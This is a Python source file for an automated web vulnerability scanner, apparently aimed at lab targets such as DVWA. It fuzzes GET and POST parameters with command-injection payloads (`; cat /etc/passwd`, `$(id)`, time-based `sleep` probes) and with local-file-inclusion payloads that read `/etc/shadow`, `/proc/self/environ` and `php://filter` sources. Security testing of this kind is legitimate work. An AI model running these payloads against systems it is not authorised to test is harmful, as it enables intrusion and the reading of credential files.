#!/usr/bin/env python3
"""
Fixed AutoVulnerabilityScanner
Changes from the original:
1. Dropped whoami-only payloads that can never match any indicator (Bug #1).
   Replaced with time-based blind-injection payloads that don't rely on the
   response echoing anything.
2. Added POST body fuzzing (--post-data), since GET-only testing misses
   POST-driven vulnerable pages like DVWA's command injection form (Bug #2).
3. Added a baseline request (no payload) so we can compare response time
   and length against something, instead of matching blind.
4. Timeouts are no longer silently discarded — a timeout on a sleep-based
   payload IS the finding for blind injection, not noise to ignore.
5. Always logs a response snippet in verbose mode, even on non-matches,
   so you can visually sanity-check what the app is actually returning.
"""

import requests
import time
from typing import List, Dict, Any, Optional
from urllib.parse import urlparse, parse_qs
from datetime import datetime
from requests.exceptions import RequestException, Timeout, ConnectionError
import warnings

warnings.filterwarnings('ignore')


class AutoVulnerabilityScanner:
    def __init__(self, target_url: str, timeout: int = 10, verbose: bool = True,
                 post_data: Optional[Dict[str, str]] = None,
                 cookies: Optional[Dict[str, str]] = None):
        self.target_url = target_url
        self.timeout = timeout
        self.verbose = verbose
        self.session = requests.Session()
        self.session.verify = False
        self.vulnerabilities = []

        # Auth cookies (e.g. DVWA's PHPSESSID + security level cookie).
        # Without these, apps that gate pages behind login will just
        # redirect every request and you'll "scan" the login page instead
        # of the actual vulnerable page.
        if cookies:
            self.session.cookies.update(cookies)

        # post_data lets you fuzz POST forms (e.g. DVWA's exec page: {"ip": "127.0.0.1", "Submit": "Submit"})
        # Every key in this dict gets fuzzed one at a time, same as GET params.
        self.post_data = post_data or {}

        # Payloads that print something you can grep for in the response.
        # (Removed the whoami-only ones — no indicator can ever catch them.)
        self.ci_indicators_payloads = [
            '; id', '| id', '`id`', '$(id)', '&& id', '|| id',
            '; ls -la', '| ls -la',
            '; cat /etc/passwd', '| cat /etc/passwd',
            '`cat /etc/passwd`', '$(cat /etc/passwd)',
        ]

        # Time-based (blind) payloads: no output needed, we just measure delay.
        # SLEEP_SECONDS must be long enough to be unmistakable but short
        # enough not to make scans painfully slow.
        self.sleep_seconds = 6
        self.ci_blind_payloads = [
            f'; sleep {self.sleep_seconds}', f'| sleep {self.sleep_seconds}',
            f'`sleep {self.sleep_seconds}`', f'$(sleep {self.sleep_seconds})',
            f'&& sleep {self.sleep_seconds}',
        ]

        self.lfi_payloads = [
            '../../../etc/passwd', '../../etc/passwd', '../etc/passwd',
            '....//....//....//etc/passwd', '../../../etc/passwd%00',
            '../../../etc/shadow', '../../../proc/self/environ',
            'php://filter/convert.base64-encode/resource=index.php',
            'php://input', '/etc/passwd', 'file:///etc/passwd',
        ]

        self.ci_indicators = [
            'root:x:', 'bin/bash', 'bin/sh', 'uid=', 'gid=', 'groups=', 'total', 'drwx',
        ]
        self.lfi_indicators = [
            'root:x:', 'bin/bash', 'bin/sh', 'nologin', '<?php', '<?=', 'USER=', 'PATH=', 'HOME=',
        ]

        self.scan_results = {
            'target': target_url,
            'timestamp': datetime.now().isoformat(),
            'scan_status': 'In Progress',
            'vulnerabilities': [],
            'scan_type': 'AUTOMATIC',
            'payloads_tested': {
                'command_injection_indicator_based': len(self.ci_indicators_payloads),
                'command_injection_time_based': len(self.ci_blind_payloads),
                'file_inclusion': len(self.lfi_payloads),
            }
        }

    def log(self, message: str):
        if self.verbose:
            print(message)

    def extract_parameters(self, url: str) -> Dict[str, str]:
        parsed = urlparse(url)
        params = {}
        if parsed.query:
            query_params = parse_qs(parsed.query, keep_blank_values=True)
            for key, value_list in query_params.items():
                params[key] = value_list[0] if value_list else ''
        return params

    def _send(self, base_url: str, get_params: Dict[str, str], use_post: bool, timeout: int):
        if use_post:
            return self.session.post(base_url, data=get_params, timeout=timeout, verify=False)
        return self.session.get(base_url, params=get_params, timeout=timeout, verify=False)

    def _get_targets(self):
        """Yields (base_url, param_dict, use_post) for every param source we can test."""
        targets = []
        base_url = self.target_url.split('?')[0]

        get_params = self.extract_parameters(self.target_url)
        if get_params:
            targets.append((base_url, get_params, False))
        else:
            self.log("[!] No GET query parameters found in the URL.")

        if self.post_data:
            targets.append((base_url, self.post_data, True))
        elif not get_params:
            self.log("[!] No --post-data supplied either. If this app takes input via a POST "
                      "form (e.g. DVWA's command injection page), pass --post-data "
                      "\"ip=127.0.0.1&Submit=Submit\" or nothing will ever be tested.")
        return targets

    def auto_scan_command_injection(self) -> List[Dict]:
        results = []
        targets = self._get_targets()
        if not targets:
            return results

        for base_url, params, use_post in targets:
            method = "POST" if use_post else "GET"
            self.log(f"\n[AUTO] Testing {method} params {list(params.keys())} for command injection")

            for param_name in params.keys():
                # --- Baseline (no payload) so we know normal response time/length ---
                try:
                    baseline_resp = self._send(base_url, params, use_post, self.timeout)
                    baseline_time = baseline_resp.elapsed.total_seconds()
                    baseline_len = len(baseline_resp.text)
                except (RequestException, Timeout, ConnectionError):
                    baseline_time, baseline_len = None, None

                # --- Indicator-based payloads ---
                for payload in self.ci_indicators_payloads:
                    test_params = params.copy()
                    test_params[param_name] = payload
                    try:
                        response = self._send(base_url, test_params, use_post, self.timeout)
                        snippet = response.text[:200].replace("\n", " ")
                        self.log(f"    [{method}] {param_name}={payload!r} -> "
                                 f"status={response.status_code} snippet={snippet!r}")

                        vulnerable = any(ind in response.text.lower() for ind in self.ci_indicators)
                        if vulnerable:
                            result = {
                                'type': 'Command Injection',
                                'detection': 'indicator-match',
                                'severity': 'CRITICAL',
                                'url': base_url,
                                'method': method,
                                'parameter': param_name,
                                'payload': payload,
                                'vulnerable': True,
                                'status_code': response.status_code,
                                'evidence': snippet,
                            }
                            results.append(result)
                            self.vulnerabilities.append(result)
                            self.log(f"[FOUND] CRITICAL - Command Injection on '{param_name}' "
                                      f"with payload: {payload}")
                    except Timeout:
                        self.log(f"    [{method}] {param_name}={payload!r} -> TIMED OUT "
                                 f"(not treated as a hang for non-sleep payloads, but worth a manual look)")
                    except (RequestException, ConnectionError):
                        pass

                # --- Time-based (blind) payloads ---
                for payload in self.ci_blind_payloads:
                    test_params = params.copy()
                    test_params[param_name] = payload
                    probe_timeout = self.timeout + self.sleep_seconds + 3
                    try:
                        start = time.time()
                        response = self._send(base_url, test_params, use_post, probe_timeout)
                        elapsed = time.time() - start
                        self.log(f"    [{method}] {param_name}={payload!r} -> "
                                 f"elapsed={elapsed:.1f}s (baseline={baseline_time})")

                        if baseline_time is not None and elapsed >= baseline_time + self.sleep_seconds - 1:
                            result = {
                                'type': 'Command Injection',
                                'detection': 'time-based-blind',
                                'severity': 'CRITICAL',
                                'url': base_url,
                                'method': method,
                                'parameter': param_name,
                                'payload': payload,
                                'vulnerable': True,
                                'baseline_response_time': baseline_time,
                                'observed_response_time': elapsed,
                            }
                            results.append(result)
                            self.vulnerabilities.append(result)
                            self.log(f"[FOUND] CRITICAL - Blind Command Injection on '{param_name}' "
                                      f"(response delayed ~{elapsed - baseline_time:.1f}s beyond baseline)")
                    except Timeout:
                        # The request itself timed out at probe_timeout — that's still
                        # consistent with the sleep executing. Flag it, don't discard it.
                        result = {
                            'type': 'Command Injection',
                            'detection': 'time-based-blind (request timeout)',
                            'severity': 'CRITICAL',
                            'url': base_url,
                            'method': method,
                            'parameter': param_name,
                            'payload': payload,
                            'vulnerable': True,
                            'note': f'Request exceeded {probe_timeout}s, consistent with sleep executing',
                        }
                        results.append(result)
                        self.vulnerabilities.append(result)
                        self.log(f"[FOUND] CRITICAL - Blind Command Injection on '{param_name}' "
                                  f"(request timed out at {probe_timeout}s)")
                    except (RequestException, ConnectionError):
                        pass

        return results

    def auto_scan_file_inclusion(self) -> List[Dict]:
        results = []
        targets = self._get_targets()
        if not targets:
            return results

        for base_url, params, use_post in targets:
            method = "POST" if use_post else "GET"
            self.log(f"\n[AUTO] Testing {method} params {list(params.keys())} for file inclusion")

            for param_name in params.keys():
                for payload in self.lfi_payloads:
                    test_params = params.copy()
                    test_params[param_name] = payload
                    try:
                        response = self._send(base_url, test_params, use_post, self.timeout)
                        snippet = response.text[:200].replace("\n", " ")
                        self.log(f"    [{method}] {param_name}={payload!r} -> "
                                 f"status={response.status_code} snippet={snippet!r}")

                        vulnerable = any(ind.lower() in response.text.lower() for ind in self.lfi_indicators)
                        if vulnerable:
                            result = {
                                'type': 'File Inclusion (LFI)',
                                'severity': 'HIGH',
                                'url': base_url,
                                'method': method,
                                'parameter': param_name,
                                'payload': payload,
                                'vulnerable': True,
                                'status_code': response.status_code,
                                'evidence': snippet,
                            }
                            results.append(result)
                            self.vulnerabilities.append(result)
                            self.log(f"[FOUND] HIGH - File Inclusion on '{param_name}' with payload: {payload}")
                    except (RequestException, Timeout, ConnectionError):
                        pass

        return results

    def _preflight_auth_check(self):
        """Warn loudly if we're clearly being bounced to a login page.
        This is the #1 reason authenticated apps (DVWA, Juice Shop admin
        panels, etc.) come back as '0 vulnerabilities' - you're scanning
        the login form, not the real page."""
        try:
            resp = self.session.get(self.target_url, timeout=self.timeout, verify=False)
            final_url = resp.url.lower()
            body_lower = resp.text.lower()
            looks_like_login = (
                'login' in final_url or
                ('password' in body_lower and 'username' in body_lower and '<form' in body_lower)
            )
            if looks_like_login:
                print("\n" + "!" * 70)
                print("[WARNING] This request appears to have landed on a LOGIN page")
                print(f"          Final URL after redirects: {resp.url}")
                print("          If the target requires auth (e.g. DVWA), pass session")
                print("          cookies with --cookie 'PHPSESSID=...; security=low'")
                print("          Otherwise every payload below is hitting the login")
                print("          form, not the actual vulnerable page.")
                print("!" * 70 + "\n")
        except (RequestException, Timeout, ConnectionError):
            pass

    def run_automatic_scan(self) -> Dict:
        print("\n" + "=" * 70)
        print("🔐 AUTOMATIC VULNERABILITY SCANNER (fixed)")
        print("=" * 70)
        print(f"[+] Target: {self.target_url}")
        if self.post_data:
            print(f"[+] POST data to fuzz: {self.post_data}")
        print("=" * 70)

        self._preflight_auth_check()

        self.log("\n[*] PHASE 1: Command Injection Detection (indicator + time-based)")
        print("-" * 70)
        ci_results = self.auto_scan_command_injection()

        self.log("\n\n[*] PHASE 2: File Inclusion Detection")
        print("-" * 70)
        lfi_results = self.auto_scan_file_inclusion()

        self.scan_results['vulnerabilities'] = self.vulnerabilities
        self.scan_results['summary'] = {
            'total_vulnerabilities': len(self.vulnerabilities),
            'critical_count': len([v for v in self.vulnerabilities if v.get('severity') == 'CRITICAL']),
            'high_count': len([v for v in self.vulnerabilities if v.get('severity') == 'HIGH']),
            'command_injection_found': len(ci_results),
            'file_inclusion_found': len(lfi_results),
        }
        self.scan_results['scan_status'] = 'Completed'

        print("\n" + "=" * 70)
        print("[+] SCAN COMPLETED")
        print(f"[+] Vulnerabilities Found: {self.scan_results['summary']['total_vulnerabilities']}")
        print(f"    ├─ CRITICAL: {self.scan_results['summary']['critical_count']}")
        print(f"    └─ HIGH: {self.scan_results['summary']['high_count']}")
        print("=" * 70 + "\n")

        return self.scan_results
